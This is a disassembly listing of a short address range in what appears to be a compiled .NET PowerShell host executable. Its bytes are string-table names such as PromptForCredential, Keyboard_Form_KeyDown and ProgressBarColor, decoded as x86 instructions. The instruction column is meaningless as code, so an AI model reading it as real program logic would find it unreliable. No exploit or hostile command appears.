  407831:	00 43 75             	add    %al,0x75(%ebx)
  407834:	72 73                	jb     0x4078a9
  407836:	6f                   	outsl  %ds:(%esi),(%dx)
  407837:	72 53                	jb     0x40788c
  407839:	69 7a 65 00 46 6f 72 	imul   $0x726f4600,0x65(%edx),%edi
  407840:	65 67 72 6f          	gs addr16 jb 0x4078b3
  407844:	75 6e                	jne    0x4078b4
  407846:	64 43                	fs inc %ebx
  407848:	6f                   	outsl  %ds:(%esi),(%dx)
  407849:	6c                   	insb   (%dx),%es:(%edi)
  40784a:	6f                   	outsl  %ds:(%esi),(%dx)
  40784b:	72 00                	jb     0x40784d
  40784d:	4b                   	dec    %ebx
  40784e:	65 79 41             	gs jns 0x407892
  407851:	76 61                	jbe    0x4078b4
  407853:	69 6c 61 62 6c 65 00 	imul   $0x4d00656c,0x62(%ecx,%eiz,2),%ebp
  40785a:	4d 
  40785b:	61                   	popa
  40785c:	78 50                	js     0x4078ae
  40785e:	68 79 73 69 63       	push   $0x63697379
  407863:	61                   	popa
  407864:	6c                   	insb   (%dx),%es:(%edi)
  407865:	57                   	push   %edi
  407866:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  40786d:	7a 65                	jp     0x4078d4
  40786f:	00 4d 61             	add    %cl,0x61(%ebp)
  407872:	78 57                	js     0x4078cb
  407874:	69 6e 64 6f 77 53 69 	imul   $0x6953776f,0x64(%esi),%ebp
  40787b:	7a 65                	jp     0x4078e2
  40787d:	00 57 69             	add    %dl,0x69(%edi)
  407880:	6e                   	outsb  %ds:(%esi),(%dx)
  407881:	64 6f                	outsl  %fs:(%esi),(%dx)
  407883:	77 50                	ja     0x4078d5
  407885:	6f                   	outsl  %ds:(%esi),(%dx)
  407886:	73 69                	jae    0x4078f1
  407888:	74 69                	je     0x4078f3
  40788a:	6f                   	outsl  %ds:(%esi),(%dx)
  40788b:	6e                   	outsb  %ds:(%esi),(%dx)
  40788c:	00 57 69             	add    %dl,0x69(%edi)
  40788f:	6e                   	outsb  %ds:(%esi),(%dx)
  407890:	64 6f                	outsl  %fs:(%esi),(%dx)
  407892:	77 53                	ja     0x4078e7
  407894:	69 7a 65 00 57 69 6e 	imul   $0x6e695700,0x65(%edx),%edi
  40789b:	64 6f                	outsl  %fs:(%esi),(%dx)
  40789d:	77 54                	ja     0x4078f3
  40789f:	69 74 6c 65 00 4d 42 	imul   $0x5f424d00,0x65(%esp,%ebp,2),%esi
  4078a6:	5f 
  4078a7:	47                   	inc    %edi
  4078a8:	65 74 53             	gs je  0x4078fe
  4078ab:	74 72                	je     0x40791f
  4078ad:	69 6e 67 00 44 69 61 	imul   $0x61694400,0x67(%esi),%ebp
  4078b4:	6c                   	insb   (%dx),%es:(%edi)
  4078b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4078b6:	67 52                	addr16 push %edx
  4078b8:	65 73 75             	gs jae 0x407930
  4078bb:	6c                   	insb   (%dx),%es:(%edi)
  4078bc:	74 00                	je     0x4078be
  4078be:	53                   	push   %ebx
  4078bf:	68 6f 77 00 53       	push   $0x5300776f
  4078c4:	79 73                	jns    0x407939
  4078c6:	74 65                	je     0x40792d
  4078c8:	6d                   	insl   (%dx),%es:(%edi)
  4078c9:	2e 43                	cs inc %ebx
  4078cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4078cc:	6c                   	insb   (%dx),%es:(%edi)
  4078cd:	6c                   	insb   (%dx),%es:(%edi)
  4078ce:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4078d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4078d4:	73 2e                	jae    0x407904
  4078d6:	4f                   	dec    %edi
  4078d7:	62 6a 65             	bound  %ebp,0x65(%edx)
  4078da:	63 74 4d 6f          	arpl   %esi,0x6f(%ebp,%ecx,2)
  4078de:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4078e1:	00 43 6f             	add    %al,0x6f(%ebx)
  4078e4:	6c                   	insb   (%dx),%es:(%edi)
  4078e5:	6c                   	insb   (%dx),%es:(%edi)
  4078e6:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4078eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4078ec:	60                   	pusha
  4078ed:	31 00                	xor    %eax,(%eax)
  4078ef:	43                   	inc    %ebx
  4078f0:	68 6f 69 63 65       	push   $0x6563696f
  4078f5:	44                   	inc    %esp
  4078f6:	65 73 63             	gs jae 0x40795c
  4078f9:	72 69                	jb     0x407964
  4078fb:	70 74                	jo     0x407971
  4078fd:	69 6f 6e 00 54 6f 55 	imul   $0x556f5400,0x6e(%edi),%ebp
  407904:	6e                   	outsb  %ds:(%esi),(%dx)
  407905:	69 63 6f 64 65 00 4b 	imul   $0x4b006564,0x6f(%ebx),%esp
  40790c:	65 79 73             	gs jns 0x407982
  40790f:	00 47 65             	add    %al,0x65(%edi)
  407912:	74 43                	je     0x407957
  407914:	68 61 72 46 72       	push   $0x72467261
  407919:	6f                   	outsl  %ds:(%esi),(%dx)
  40791a:	6d                   	insl   (%dx),%es:(%edi)
  40791b:	4b                   	dec    %ebx
  40791c:	65 79 73             	gs jns 0x407992
  40791f:	00 63 68             	add    %ah,0x68(%ebx)
  407922:	65 63 6b 4b          	arpl   %ebp,%gs:0x4b(%ebx)
  407926:	65 79 44             	gs jns 0x40796d
  407929:	6f                   	outsl  %ds:(%esi),(%dx)
  40792a:	77 6e                	ja     0x40799a
  40792c:	00 6b 65             	add    %ch,0x65(%ebx)
  40792f:	79 69                	jns    0x40799a
  407931:	6e                   	outsb  %ds:(%esi),(%dx)
  407932:	66 6f                	outsw  %ds:(%esi),(%dx)
  407934:	00 4b 65             	add    %cl,0x65(%ebx)
  407937:	79 45                	jns    0x40797e
  407939:	76 65                	jbe    0x4079a0
  40793b:	6e                   	outsb  %ds:(%esi),(%dx)
  40793c:	74 41                	je     0x40797f
  40793e:	72 67                	jb     0x4079a7
  407940:	73 00                	jae    0x407942
  407942:	4b                   	dec    %ebx
  407943:	65 79 62             	gs jns 0x4079a8
  407946:	6f                   	outsl  %ds:(%esi),(%dx)
  407947:	61                   	popa
  407948:	72 64                	jb     0x4079ae
  40794a:	5f                   	pop    %edi
  40794b:	46                   	inc    %esi
  40794c:	6f                   	outsl  %ds:(%esi),(%dx)
  40794d:	72 6d                	jb     0x4079bc
  40794f:	5f                   	pop    %edi
  407950:	4b                   	dec    %ebx
  407951:	65 79 44             	gs jns 0x407998
  407954:	6f                   	outsl  %ds:(%esi),(%dx)
  407955:	77 6e                	ja     0x4079c5
  407957:	00 4b 65             	add    %cl,0x65(%ebx)
  40795a:	79 62                	jns    0x4079be
  40795c:	6f                   	outsl  %ds:(%esi),(%dx)
  40795d:	61                   	popa
  40795e:	72 64                	jb     0x4079c4
  407960:	5f                   	pop    %edi
  407961:	46                   	inc    %esi
  407962:	6f                   	outsl  %ds:(%esi),(%dx)
  407963:	72 6d                	jb     0x4079d2
  407965:	5f                   	pop    %edi
  407966:	4b                   	dec    %ebx
  407967:	65 79 55             	gs jns 0x4079bf
  40796a:	70 00                	jo     0x40796c
  40796c:	50                   	push   %eax
  40796d:	72 6f                	jb     0x4079de
  40796f:	67 72 65             	addr16 jb 0x4079d7
  407972:	73 73                	jae    0x4079e7
  407974:	42                   	inc    %edx
  407975:	61                   	popa
  407976:	72 43                	jb     0x4079bb
  407978:	6f                   	outsl  %ds:(%esi),(%dx)
  407979:	6c                   	insb   (%dx),%es:(%edi)
  40797a:	6f                   	outsl  %ds:(%esi),(%dx)
  40797b:	72 00                	jb     0x40797d
  40797d:	53                   	push   %ebx
  40797e:	79 73                	jns    0x4079f3
  407980:	74 65                	je     0x4079e7
  407982:	6d                   	insl   (%dx),%es:(%edi)
  407983:	2e 54                	cs push %esp
  407985:	69 6d 65 72 73 00 54 	imul   $0x54007372,0x65(%ebp),%ebp
  40798c:	69 6d 65 72 00 74 69 	imul   $0x69740072,0x65(%ebp),%ebp
  407993:	6d                   	insl   (%dx),%es:(%edi)
  407994:	65 72 00             	gs jb  0x407997
  407997:	62 61 72             	bound  %esp,0x72(%ecx)
  40799a:	4e                   	dec    %esi
  40799b:	75 6d                	jne    0x407a0a
  40799d:	62 65 72             	bound  %esp,0x72(%ebp)
  4079a0:	00 62 61             	add    %ah,0x61(%edx)
  4079a3:	72 56                	jb     0x4079fb
  4079a5:	61                   	popa
  4079a6:	6c                   	insb   (%dx),%es:(%edi)
  4079a7:	75 65                	jne    0x407a0e
  4079a9:	00 69 6e             	add    %ch,0x6e(%ecx)
  4079ac:	54                   	push   %esp
  4079ad:	69 63 6b 00 53 79 73 	imul   $0x73795300,0x6b(%ebx),%esp
  4079b4:	74 65                	je     0x407a1b
  4079b6:	6d                   	insl   (%dx),%es:(%edi)
  4079b7:	2e 43                	cs inc %ebx
  4079b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4079ba:	6c                   	insb   (%dx),%es:(%edi)
  4079bb:	6c                   	insb   (%dx),%es:(%edi)
  4079bc:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4079c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4079c2:	73 2e                	jae    0x4079f2
  4079c4:	47                   	inc    %edi
  4079c5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4079c7:	65 72 69             	gs jb  0x407a33
  4079ca:	63 00                	arpl   %eax,(%eax)
  4079cc:	4c                   	dec    %esp
  4079cd:	69 73 74 60 31 00 70 	imul   $0x70003160,0x74(%ebx),%esi
  4079d4:	72 6f                	jb     0x407a45
  4079d6:	67 72 65             	addr16 jb 0x407a3e
  4079d9:	73 73                	jae    0x407a4e
  4079db:	44                   	inc    %esp
  4079dc:	61                   	popa
  4079dd:	74 61                	je     0x407a40
  4079df:	4c                   	dec    %esp
  4079e0:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  4079e7:	74 65                	je     0x407a4e
  4079e9:	6d                   	insl   (%dx),%es:(%edi)
  4079ea:	2e 44                	cs inc %esp
  4079ec:	72 61                	jb     0x407a4f
  4079ee:	77 69                	ja     0x407a59
  4079f0:	6e                   	outsb  %ds:(%esi),(%dx)
  4079f1:	67 00 43 6f          	add    %al,0x6f(%bp,%di)
  4079f5:	6c                   	insb   (%dx),%es:(%edi)
  4079f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4079f7:	72 00                	jb     0x4079f9
  4079f9:	44                   	inc    %esp
  4079fa:	72 61                	jb     0x407a5d
  4079fc:	77 69                	ja     0x407a67
  4079fe:	6e                   	outsb  %ds:(%esi),(%dx)
  4079ff:	67 43                	addr16 inc %ebx
  407a01:	6f                   	outsl  %ds:(%esi),(%dx)
  407a02:	6c                   	insb   (%dx),%es:(%edi)
  407a03:	6f                   	outsl  %ds:(%esi),(%dx)
  407a04:	72 00                	jb     0x407a06
  407a06:	49                   	dec    %ecx
  407a07:	6e                   	outsb  %ds:(%esi),(%dx)
  407a08:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407a0f:	65 
  407a10:	43                   	inc    %ebx
  407a11:	6f                   	outsl  %ds:(%esi),(%dx)
  407a12:	6d                   	insl   (%dx),%es:(%edi)
  407a13:	70 6f                	jo     0x407a84
  407a15:	6e                   	outsb  %ds:(%esi),(%dx)
  407a16:	65 6e                	outsb  %gs:(%esi),(%dx)
  407a18:	74 00                	je     0x407a1a
  407a1a:	45                   	inc    %ebp
  407a1b:	6c                   	insb   (%dx),%es:(%edi)
  407a1c:	61                   	popa
  407a1d:	70 73                	jo     0x407a92
  407a1f:	65 64 45             	gs fs inc %ebp
  407a22:	76 65                	jbe    0x407a89
  407a24:	6e                   	outsb  %ds:(%esi),(%dx)
  407a25:	74 41                	je     0x407a68
  407a27:	72 67                	jb     0x407a90
  407a29:	73 00                	jae    0x407a2b
  407a2b:	54                   	push   %esp
  407a2c:	69 6d 65 54 69 63 6b 	imul   $0x6b636954,0x65(%ebp),%ebp
  407a33:	00 41 64             	add    %al,0x64(%ecx)
  407a36:	64 42                	fs inc %edx
  407a38:	61                   	popa
  407a39:	72 00                	jb     0x407a3b
  407a3b:	47                   	inc    %edi
  407a3c:	65 74 43             	gs je  0x407a82
  407a3f:	6f                   	outsl  %ds:(%esi),(%dx)
  407a40:	75 6e                	jne    0x407ab0
  407a42:	74 00                	je     0x407a44
  407a44:	50                   	push   %eax
  407a45:	72 6f                	jb     0x407ab6
  407a47:	67 72 65             	addr16 jb 0x407aaf
  407a4a:	73 73                	jae    0x407abf
  407a4c:	52                   	push   %edx
  407a4d:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  407a51:	64 00 55 70          	add    %dl,%fs:0x70(%ebp)
  407a55:	64 61                	fs popa
  407a57:	74 65                	je     0x407abe
  407a59:	00 4c 61 62          	add    %cl,0x62(%ecx,%eiz,2)
  407a5d:	65 6c                	gs insb (%dx),%es:(%edi)
  407a5f:	00 6c 62 41          	add    %ch,0x41(%edx,%eiz,2)
  407a63:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407a67:	69 74 79 00 6c 62 53 	imul   $0x7453626c,0x0(%ecx,%edi,2),%esi
  407a6e:	74 
  407a6f:	61                   	popa
  407a70:	74 75                	je     0x407ae7
  407a72:	73 00                	jae    0x407a74
  407a74:	50                   	push   %eax
  407a75:	72 6f                	jb     0x407ae6
  407a77:	67 72 65             	addr16 jb 0x407adf
  407a7a:	73 73                	jae    0x407aef
  407a7c:	42                   	inc    %edx
  407a7d:	61                   	popa
  407a7e:	72 00                	jb     0x407a80
  407a80:	6f                   	outsl  %ds:(%esi),(%dx)
  407a81:	62 6a 50             	bound  %ebp,0x50(%edx)
  407a84:	72 6f                	jb     0x407af5
  407a86:	67 72 65             	addr16 jb 0x407aee
  407a89:	73 73                	jae    0x407afe
  407a8b:	42                   	inc    %edx
  407a8c:	61                   	popa
  407a8d:	72 00                	jb     0x407a8f
  407a8f:	6c                   	insb   (%dx),%es:(%edi)
  407a90:	62 52 65             	bound  %edx,0x65(%edx)
  407a93:	6d                   	insl   (%dx),%es:(%edi)
  407a94:	61                   	popa
  407a95:	69 6e 69 6e 67 54 69 	imul   $0x6954676e,0x69(%esi),%ebp
  407a9c:	6d                   	insl   (%dx),%es:(%edi)
  407a9d:	65 00 6c 62 4f       	add    %ch,%gs:0x4f(%edx,%eiz,2)
  407aa2:	70 65                	jo     0x407b09
  407aa4:	72 61                	jb     0x407b07
  407aa6:	74 69                	je     0x407b11
  407aa8:	6f                   	outsl  %ds:(%esi),(%dx)
  407aa9:	6e                   	outsb  %ds:(%esi),(%dx)
  407aaa:	00 41 63             	add    %al,0x63(%ecx)
  407aad:	74 69                	je     0x407b18
  407aaf:	76 69                	jbe    0x407b1a
  407ab1:	74 79                	je     0x407b2c
  407ab3:	49                   	dec    %ecx
  407ab4:	64 00 50 61          	add    %dl,%fs:0x61(%eax)
  407ab8:	72 65                	jb     0x407b1f
  407aba:	6e                   	outsb  %ds:(%esi),(%dx)
  407abb:	74 41                	je     0x407afe
  407abd:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  407ac1:	69 74 79 49 64 00 44 	imul   $0x65440064,0x49(%ecx,%edi,2),%esi
  407ac8:	65 
  407ac9:	70 74                	jo     0x407b3f
  407acb:	68 00 47 65 74       	push   $0x74654700
  407ad0:	53                   	push   %ebx
  407ad1:	74 64                	je     0x407b37
  407ad3:	48                   	dec    %eax
  407ad4:	61                   	popa
  407ad5:	6e                   	outsb  %ds:(%esi),(%dx)
  407ad6:	64 6c                	fs insb (%dx),%es:(%edi)
  407ad8:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  407adc:	74 46                	je     0x407b24
  407ade:	69 6c 65 54 79 70 65 	imul   $0x657079,0x54(%ebp,%eiz,2),%ebp
  407ae5:	00 
  407ae6:	49                   	dec    %ecx
  407ae7:	73 49                	jae    0x407b32
  407ae9:	6e                   	outsb  %ds:(%esi),(%dx)
  407aea:	70 75                	jo     0x407b61
  407aec:	74 52                	je     0x407b40
  407aee:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407af5:	65 64 
  407af7:	00 49 73             	add    %cl,0x73(%ecx)
  407afa:	4f                   	dec    %edi
  407afb:	75 74                	jne    0x407b71
  407afd:	70 75                	jo     0x407b74
  407aff:	74 52                	je     0x407b53
  407b01:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407b08:	65 64 
  407b0a:	00 49 73             	add    %cl,0x73(%ecx)
  407b0d:	45                   	inc    %ebp
  407b0e:	72 72                	jb     0x407b82
  407b10:	6f                   	outsl  %ds:(%esi),(%dx)
  407b11:	72 52                	jb     0x407b65
  407b13:	65 64 69 72 65 63 74 	gs imul $0x64657463,%fs:0x65(%edx),%esi
  407b1a:	65 64 
  407b1c:	00 46 49             	add    %al,0x49(%esi)
  407b1f:	4c                   	dec    %esp
  407b20:	45                   	inc    %ebp
  407b21:	5f                   	pop    %edi
  407b22:	54                   	push   %esp
  407b23:	59                   	pop    %ecx
  407b24:	50                   	push   %eax
  407b25:	45                   	inc    %ebp
  407b26:	5f                   	pop    %edi
  407b27:	55                   	push   %ebp
  407b28:	4e                   	dec    %esi
  407b29:	4b                   	dec    %ebx
  407b2a:	4e                   	dec    %esi
  407b2b:	4f                   	dec    %edi
  407b2c:	57                   	push   %edi
  407b2d:	4e                   	dec    %esi
  407b2e:	00 46 49             	add    %al,0x49(%esi)
  407b31:	4c                   	dec    %esp
  407b32:	45                   	inc    %ebp
  407b33:	5f                   	pop    %edi
  407b34:	54                   	push   %esp
  407b35:	59                   	pop    %ecx
  407b36:	50                   	push   %eax
  407b37:	45                   	inc    %ebp
  407b38:	5f                   	pop    %edi
  407b39:	44                   	inc    %esp
  407b3a:	49                   	dec    %ecx
  407b3b:	53                   	push   %ebx
  407b3c:	4b                   	dec    %ebx
  407b3d:	00 46 49             	add    %al,0x49(%esi)
  407b40:	4c                   	dec    %esp
  407b41:	45                   	inc    %ebp
  407b42:	5f                   	pop    %edi
  407b43:	54                   	push   %esp
  407b44:	59                   	pop    %ecx
  407b45:	50                   	push   %eax
  407b46:	45                   	inc    %ebp
  407b47:	5f                   	pop    %edi
  407b48:	43                   	inc    %ebx
  407b49:	48                   	dec    %eax
  407b4a:	41                   	inc    %ecx
  407b4b:	52                   	push   %edx
  407b4c:	00 46 49             	add    %al,0x49(%esi)
  407b4f:	4c                   	dec    %esp
  407b50:	45                   	inc    %ebp
  407b51:	5f                   	pop    %edi
  407b52:	54                   	push   %esp
  407b53:	59                   	pop    %ecx
  407b54:	50                   	push   %eax
  407b55:	45                   	inc    %ebp
  407b56:	5f                   	pop    %edi
  407b57:	50                   	push   %eax
  407b58:	49                   	dec    %ecx
  407b59:	50                   	push   %eax
  407b5a:	45                   	inc    %ebp
  407b5b:	00 46 49             	add    %al,0x49(%esi)
  407b5e:	4c                   	dec    %esp
  407b5f:	45                   	inc    %ebp
  407b60:	5f                   	pop    %edi
  407b61:	54                   	push   %esp
  407b62:	59                   	pop    %ecx
  407b63:	50                   	push   %eax
  407b64:	45                   	inc    %ebp
  407b65:	5f                   	pop    %edi
  407b66:	52                   	push   %edx
  407b67:	45                   	inc    %ebp
  407b68:	4d                   	dec    %ebp
  407b69:	4f                   	dec    %edi
  407b6a:	54                   	push   %esp
  407b6b:	45                   	inc    %ebp
  407b6c:	00 53 54             	add    %dl,0x54(%ebx)
  407b6f:	44                   	inc    %esp
  407b70:	5f                   	pop    %edi
  407b71:	49                   	dec    %ecx
  407b72:	4e                   	dec    %esi
  407b73:	50                   	push   %eax
  407b74:	55                   	push   %ebp
  407b75:	54                   	push   %esp
  407b76:	5f                   	pop    %edi
  407b77:	48                   	dec    %eax
  407b78:	41                   	inc    %ecx
  407b79:	4e                   	dec    %esi
  407b7a:	44                   	inc    %esp
  407b7b:	4c                   	dec    %esp
  407b7c:	45                   	inc    %ebp
  407b7d:	00 53 54             	add    %dl,0x54(%ebx)
  407b80:	44                   	inc    %esp
  407b81:	5f                   	pop    %edi
  407b82:	4f                   	dec    %edi
  407b83:	55                   	push   %ebp
  407b84:	54                   	push   %esp
  407b85:	50                   	push   %eax
  407b86:	55                   	push   %ebp
  407b87:	54                   	push   %esp
  407b88:	5f                   	pop    %edi
  407b89:	48                   	dec    %eax
  407b8a:	41                   	inc    %ecx
  407b8b:	4e                   	dec    %esi
  407b8c:	44                   	inc    %esp
  407b8d:	4c                   	dec    %esp
  407b8e:	45                   	inc    %ebp
  407b8f:	00 53 54             	add    %dl,0x54(%ebx)
  407b92:	44                   	inc    %esp
  407b93:	5f                   	pop    %edi
  407b94:	45                   	inc    %ebp
  407b95:	52                   	push   %edx
  407b96:	52                   	push   %edx
  407b97:	4f                   	dec    %edi
  407b98:	52                   	push   %edx
  407b99:	5f                   	pop    %edi
  407b9a:	48                   	dec    %eax
  407b9b:	41                   	inc    %ecx
  407b9c:	4e                   	dec    %esi
  407b9d:	44                   	inc    %esp
  407b9e:	4c                   	dec    %esp
  407b9f:	45                   	inc    %ebp
  407ba0:	00 72 61             	add    %dh,0x61(%edx)
  407ba3:	77 55                	ja     0x407bfa
  407ba5:	49                   	dec    %ecx
  407ba6:	00 45 72             	add    %al,0x72(%ebp)
  407ba9:	72 6f                	jb     0x407c1a
  407bab:	72 46                	jb     0x407bf3
  407bad:	6f                   	outsl  %ds:(%esi),(%dx)
  407bae:	72 65                	jb     0x407c15
  407bb0:	67 72 6f             	addr16 jb 0x407c22
  407bb3:	75 6e                	jne    0x407c23
  407bb5:	64 43                	fs inc %ebx
  407bb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407bb8:	6c                   	insb   (%dx),%es:(%edi)
  407bb9:	6f                   	outsl  %ds:(%esi),(%dx)
  407bba:	72 00                	jb     0x407bbc
  407bbc:	45                   	inc    %ebp
  407bbd:	72 72                	jb     0x407c31
  407bbf:	6f                   	outsl  %ds:(%esi),(%dx)
  407bc0:	72 42                	jb     0x407c04
  407bc2:	61                   	popa
  407bc3:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407bc6:	72 6f                	jb     0x407c37
  407bc8:	75 6e                	jne    0x407c38
  407bca:	64 43                	fs inc %ebx
  407bcc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bcd:	6c                   	insb   (%dx),%es:(%edi)
  407bce:	6f                   	outsl  %ds:(%esi),(%dx)
  407bcf:	72 00                	jb     0x407bd1
  407bd1:	57                   	push   %edi
  407bd2:	61                   	popa
  407bd3:	72 6e                	jb     0x407c43
  407bd5:	69 6e 67 46 6f 72 65 	imul   $0x65726f46,0x67(%esi),%ebp
  407bdc:	67 72 6f             	addr16 jb 0x407c4e
  407bdf:	75 6e                	jne    0x407c4f
  407be1:	64 43                	fs inc %ebx
  407be3:	6f                   	outsl  %ds:(%esi),(%dx)
  407be4:	6c                   	insb   (%dx),%es:(%edi)
  407be5:	6f                   	outsl  %ds:(%esi),(%dx)
  407be6:	72 00                	jb     0x407be8
  407be8:	57                   	push   %edi
  407be9:	61                   	popa
  407bea:	72 6e                	jb     0x407c5a
  407bec:	69 6e 67 42 61 63 6b 	imul   $0x6b636142,0x67(%esi),%ebp
  407bf3:	67 72 6f             	addr16 jb 0x407c65
  407bf6:	75 6e                	jne    0x407c66
  407bf8:	64 43                	fs inc %ebx
  407bfa:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfb:	6c                   	insb   (%dx),%es:(%edi)
  407bfc:	6f                   	outsl  %ds:(%esi),(%dx)
  407bfd:	72 00                	jb     0x407bff
  407bff:	44                   	inc    %esp
  407c00:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407c04:	46                   	inc    %esi
  407c05:	6f                   	outsl  %ds:(%esi),(%dx)
  407c06:	72 65                	jb     0x407c6d
  407c08:	67 72 6f             	addr16 jb 0x407c7a
  407c0b:	75 6e                	jne    0x407c7b
  407c0d:	64 43                	fs inc %ebx
  407c0f:	6f                   	outsl  %ds:(%esi),(%dx)
  407c10:	6c                   	insb   (%dx),%es:(%edi)
  407c11:	6f                   	outsl  %ds:(%esi),(%dx)
  407c12:	72 00                	jb     0x407c14
  407c14:	44                   	inc    %esp
  407c15:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  407c19:	42                   	inc    %edx
  407c1a:	61                   	popa
  407c1b:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407c1e:	72 6f                	jb     0x407c8f
  407c20:	75 6e                	jne    0x407c90
  407c22:	64 43                	fs inc %ebx
  407c24:	6f                   	outsl  %ds:(%esi),(%dx)
  407c25:	6c                   	insb   (%dx),%es:(%edi)
  407c26:	6f                   	outsl  %ds:(%esi),(%dx)
  407c27:	72 00                	jb     0x407c29
  407c29:	56                   	push   %esi
  407c2a:	65 72 62             	gs jb  0x407c8f
  407c2d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c2e:	73 65                	jae    0x407c95
  407c30:	46                   	inc    %esi
  407c31:	6f                   	outsl  %ds:(%esi),(%dx)
  407c32:	72 65                	jb     0x407c99
  407c34:	67 72 6f             	addr16 jb 0x407ca6
  407c37:	75 6e                	jne    0x407ca7
  407c39:	64 43                	fs inc %ebx
  407c3b:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3c:	6c                   	insb   (%dx),%es:(%edi)
  407c3d:	6f                   	outsl  %ds:(%esi),(%dx)
  407c3e:	72 00                	jb     0x407c40
  407c40:	56                   	push   %esi
  407c41:	65 72 62             	gs jb  0x407ca6
  407c44:	6f                   	outsl  %ds:(%esi),(%dx)
  407c45:	73 65                	jae    0x407cac
  407c47:	42                   	inc    %edx
  407c48:	61                   	popa
  407c49:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407c4c:	72 6f                	jb     0x407cbd
  407c4e:	75 6e                	jne    0x407cbe
  407c50:	64 43                	fs inc %ebx
  407c52:	6f                   	outsl  %ds:(%esi),(%dx)
  407c53:	6c                   	insb   (%dx),%es:(%edi)
  407c54:	6f                   	outsl  %ds:(%esi),(%dx)
  407c55:	72 00                	jb     0x407c57
  407c57:	50                   	push   %eax
  407c58:	72 6f                	jb     0x407cc9
  407c5a:	67 72 65             	addr16 jb 0x407cc2
  407c5d:	73 73                	jae    0x407cd2
  407c5f:	46                   	inc    %esi
  407c60:	6f                   	outsl  %ds:(%esi),(%dx)
  407c61:	72 65                	jb     0x407cc8
  407c63:	67 72 6f             	addr16 jb 0x407cd5
  407c66:	75 6e                	jne    0x407cd6
  407c68:	64 43                	fs inc %ebx
  407c6a:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6b:	6c                   	insb   (%dx),%es:(%edi)
  407c6c:	6f                   	outsl  %ds:(%esi),(%dx)
  407c6d:	72 00                	jb     0x407c6f
  407c6f:	50                   	push   %eax
  407c70:	72 6f                	jb     0x407ce1
  407c72:	67 72 65             	addr16 jb 0x407cda
  407c75:	73 73                	jae    0x407cea
  407c77:	42                   	inc    %edx
  407c78:	61                   	popa
  407c79:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  407c7c:	72 6f                	jb     0x407ced
  407c7e:	75 6e                	jne    0x407cee
  407c80:	64 43                	fs inc %ebx
  407c82:	6f                   	outsl  %ds:(%esi),(%dx)
  407c83:	6c                   	insb   (%dx),%es:(%edi)
  407c84:	6f                   	outsl  %ds:(%esi),(%dx)
  407c85:	72 00                	jb     0x407c87
  407c87:	44                   	inc    %esp
  407c88:	69 63 74 69 6f 6e 61 	imul   $0x616e6f69,0x74(%ebx),%esp
  407c8f:	72 79                	jb     0x407d0a
  407c91:	60                   	pusha
  407c92:	32 00                	xor    (%eax),%al
  407c94:	50                   	push   %eax
  407c95:	53                   	push   %ebx
  407c96:	4f                   	dec    %edi
  407c97:	62 6a 65             	bound  %ebp,0x65(%edx)
  407c9a:	63 74 00 46          	arpl   %esi,0x46(%eax,%eax,1)
  407c9e:	69 65 6c 64 44 65 73 	imul   $0x73654464,0x6c(%ebp),%esp
  407ca5:	63 72 69             	arpl   %esi,0x69(%edx)
  407ca8:	70 74                	jo     0x407d1e
  407caa:	69 6f 6e 00 50 72 6f 	imul   $0x6f725000,0x6e(%edi),%ebp
  407cb1:	6d                   	insl   (%dx),%es:(%edi)
  407cb2:	70 74                	jo     0x407d28
  407cb4:	00 50 72             	add    %dl,0x72(%eax)
  407cb7:	6f                   	outsl  %ds:(%esi),(%dx)
  407cb8:	6d                   	insl   (%dx),%es:(%edi)
  407cb9:	70 74                	jo     0x407d2f
  407cbb:	46                   	inc    %esi
  407cbc:	6f                   	outsl  %ds:(%esi),(%dx)
  407cbd:	72 43                	jb     0x407d02
  407cbf:	68 6f 69 63 65       	push   $0x6563696f
  407cc4:	00 50 53             	add    %dl,0x53(%eax)
  407cc7:	43                   	inc    %ebx
  407cc8:	72 65                	jb     0x407d2f
  407cca:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407ccd:	74 69                	je     0x407d38
  407ccf:	61                   	popa
  407cd0:	6c                   	insb   (%dx),%es:(%edi)
  407cd1:	00 50 72             	add    %dl,0x72(%eax)
  407cd4:	6f                   	outsl  %ds:(%esi),(%dx)
  407cd5:	6d                   	insl   (%dx),%es:(%edi)
  407cd6:	70 74                	jo     0x407d4c
  407cd8:	46                   	inc    %esi
  407cd9:	6f                   	outsl  %ds:(%esi),(%dx)
  407cda:	72 43                	jb     0x407d1f
  407cdc:	72 65                	jb     0x407d43
  407cde:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  407ce1:	74 69                	je     0x407d4c
  407ce3:	61                   	popa
  407ce4:	6c                   	insb   (%dx),%es:(%edi)
